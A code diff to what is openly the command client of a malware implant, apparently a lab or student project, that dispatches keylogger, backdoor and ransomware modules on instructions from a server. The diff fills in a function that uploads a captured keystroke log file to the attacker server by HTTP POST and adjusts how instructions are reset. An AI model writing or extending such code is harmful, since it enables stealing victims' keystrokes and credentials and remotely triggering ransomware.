@@ -18,12 +18,12 @@ from modules import instructions
 ###########################################################################################################################
 
 KEYLOG_TXT_FILE = './media/keylog.txt'
-INSTRUCTIONS_SERVER_IP = 'http://10.0.2.15:8000/reset'
+ATTACKER_SERVER_IP = 'http://10.0.2.15:8000'
 
 # Resets the current instruction so the program waits for the new one
 def reset_instruction():
     try:
-        response = requests.get(INSTRUCTIONS_SERVER_IP)
+        response = requests.get(f'{ATTACKER_SERVER_IP}/reset_instruction')
         # Raises an HTTPError for bad responses (4xx or 5xx)
         response.raise_for_status()
         # print('\tInstruction successfully reseted!')
@@ -37,8 +37,10 @@ def reset_keylog_file():
 
 # Sends keylog.txt to the attacker machine and resets it
 def send_keylog_to_attacker():
-
-    # PLACE CODE HERE...
+    with open(KEYLOG_TXT_FILE, 'rb') as file:
+        files = {'file': (file.name, file)}
+        response = requests.post(f'{ATTACKER_SERVER_IP}/upload_file', files=files)
+        print(f'Status code: {response.status_code}')
 
     reset_keylog_file()
 
@@ -90,7 +92,8 @@ def main():
         result, next_step = modules[next_step]()
         if result:
             if result.startswith('keylogger'):
-                if result.endswith('send_log'): send_keylog_to_attacker()
+                if result.endswith('send_log'):
+                    send_keylog_to_attacker()
                 elif result.endswith('reset_log'): reset_keylog_file()
             
             elif result.startswith('backdoor'):
@@ -100,13 +103,12 @@ def main():
             elif result.startswith('ransomware') and result.endswith('deploy'):
                 deploy_ransomware()
 
-            reset_instruction()
+            if result != 'no_data': reset_instruction()
 
             if next_step == 'instructions': sleep(10)
         else:
             print(f"[-] Module {next_step} failed!")
             break
-
 
 if __name__ == "__main__":
     main()
